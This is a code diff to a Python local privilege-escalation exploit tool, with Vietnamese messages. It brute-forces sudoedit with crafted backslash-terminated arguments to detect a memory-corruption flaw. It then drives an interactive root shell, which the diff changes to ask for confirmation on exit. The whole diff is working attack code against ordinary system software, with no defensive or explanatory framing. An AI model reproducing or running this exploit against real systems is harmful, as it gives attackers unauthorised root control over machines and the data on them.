@@ -10,7 +10,7 @@ from pwn import process
 from importFile import root_directory,shlex,subprocess,os
 from executeCommand import executeInteractive, executeOnce
 from formatOutput.prettyAnnounce import log,bcolors
-from util import clean_terminal, decompress_gz, download_file, is_path_exist, list_ext_at_path,list_process, list_dir,list_process_as_root,list_dir_verbose,leak, print_check_stdout_stderr, stop_terminal
+from util import clean_terminal, decompress_gz, download_file, is_path_exist, list_ext_at_path,list_process, list_dir,list_process_as_root,list_dir_verbose,leak, print_check_stdout_stderr, stop_terminal, yes_no_ask
 from cmd import Cmd
 from findInfoSystem import is_Linux
 from menu_list import entry_dynamic_menu
@@ -35,24 +35,32 @@ def check_vuln():
         exit(1)
     else:
         error_key = b'malloc():'
+        count_try = 1
         for len_a in range(0,50):
             for len_b in range(0,200):
+                log.info(f"Brute force lần {count_try}")
+                count_try+=1
                 brute_force_argument = [
                     "/usr/bin/sudoedit",
                     '-s',
                     'a'*len_a+'\\',
                     'b'*len_b
                 ]
-                output = subprocess.run(
-                    brute_force_argument,
-                    stdout=subprocess.PIPE,
-                    stderr=subprocess.PIPE)
-                print(output)
-                if(error_key in output.stderr 
-                    or error_key in output.stdout 
-                    or output.returncode < 0):
-                    is_vuln = True
-                    return is_vuln
+                try:
+                    output = subprocess.run(
+                        brute_force_argument,
+                        stdout=subprocess.PIPE,stderr=subprocess.PIPE,
+                        timeout=1)
+                    if(error_key in output.stderr 
+                        or error_key in output.stdout 
+                        or output.returncode < 0):
+                        is_vuln = True
+                        return is_vuln
+                except:
+                    print('\n')
+                    pass 
+                # print(output)
+
         return is_vuln
 
 def build_get_root_libc():
@@ -229,7 +237,7 @@ class succes_promt(Cmd):
         self.proc.close()
         log.done("Đóng root shell!")
         log.done("Thoát tiến trình khai thác!")
-        input("Ấn Enter để tiếp tục")
+        temp1 = input("Ấn Enter để tiếp tục")
         return True
     
     def do_shell(self,arg):
@@ -246,6 +254,13 @@ class succes_promt(Cmd):
                 if(command == 'qexit'):
                     log.info("Thoát root shell!")
                     break
+                if(command == 'exit'):
+                    ret_value = yes_no_ask("Bạn có chắc muốn thoát cả tiến trình khai thác hay không? \n Gợi ý: qexit để thoát chức năng shell.")
+                    if(ret_value == 1):
+                        self.do_exit(0)
+                        return
+                    elif ret_value == -1: #chưa muốn thoát
+                        continue
                 try:
                     s.sendline(command)
                     while(True):
